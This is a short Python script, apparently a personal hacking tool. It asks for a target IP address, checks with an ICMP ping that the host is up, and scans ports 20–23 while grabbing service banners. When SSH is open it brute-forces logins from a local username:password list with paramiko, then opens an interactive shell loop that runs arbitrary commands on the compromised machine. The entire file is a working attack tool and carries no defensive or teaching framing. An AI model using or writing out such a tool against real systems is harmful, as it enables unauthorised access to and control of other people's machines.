from scapy.layers.inet import *
import socket
import paramiko
from colorama import init, Fore
init()


matara = input("enter the ipv4 of your target\n")

open_ports = []


def start_balagan():
    icmp = IP(dst=matara)/ICMP()
    response = sr1(icmp, timeout=0.5)
    if response:
        print(f"{Fore.LIGHTGREEN_EX} {matara} is alive\n {Fore.RESET}")
        sorek_ports()
    else:
        dead = input(f"{Fore.LIGHTRED_EX} {matara} looks Dead, try again ? (y/n)\n {Fore.RESET}")
        if dead == "y":
            start_balagan()
        else:
            exit()


def ssh_start():
    print(f"{Fore.LIGHTYELLOW_EX} trying now to connect to SSH {Fore.RESET}")
    global ssh
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    bruteforce_ssh()
    maximum_control()


def sorek_ports():
    for port in range(20, 24):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            s.connect((matara, port))
            print(f"{Fore.LIGHTGREEN_EX} port {port} open {Fore.RESET}")
            open_ports.append(port)
            info = s.recv(2048).decode()
            print(f"{Fore.LIGHTYELLOW_EX} the banner of {port} is {info} {Fore.RESET}")
        except:
            print(f"{Fore.LIGHTRED_EX} port {port} closed {Fore.RESET}")
        finally:
            s.close()
    print(f"{Fore.LIGHTYELLOW_EX} the open TCP ports founds are : {open_ports} {Fore.RESET}")
    if 22 in open_ports:
        ssh_start()

def bruteforce_ssh():
    n = 1
    passlist = open("C:\\Users\\ממוש\\Desktop\\123.txt", "r")
    for line in passlist.readlines():
        attempt = line.strip().split(":")
        username = attempt[0]
        password = attempt[1]

        try:
            ssh.connect(matara, 22, username, password)
            print(f"{Fore.LIGHTGREEN_EX} {n} : username {username} found ! the password is {password} ! {Fore.RESET}")
            break

        except paramiko.ssh_exception.AuthenticationException:
            print(f"{Fore.LIGHTRED_EX} {n} : Invalid User and/or Wrong Password {Fore.RESET}")

        finally:
            n += 1


def maximum_control():
    mishtalet = input(f"{Fore.LIGHTBLUE_EX}$ {Fore.RESET}")

    if mishtalet != "exit":
        stdin, stdout, stderr = ssh.exec_command(mishtalet)
        outlines = stdout.readlines()
        resp = ''.join(outlines)
        print(resp)
        errlines = stderr.readlines()
        resperr = ''.join(errlines)
        print(resperr)
        maximum_control()

    else:
        ssh.close()
        print("Good Work !")
        exit()


start_balagan()




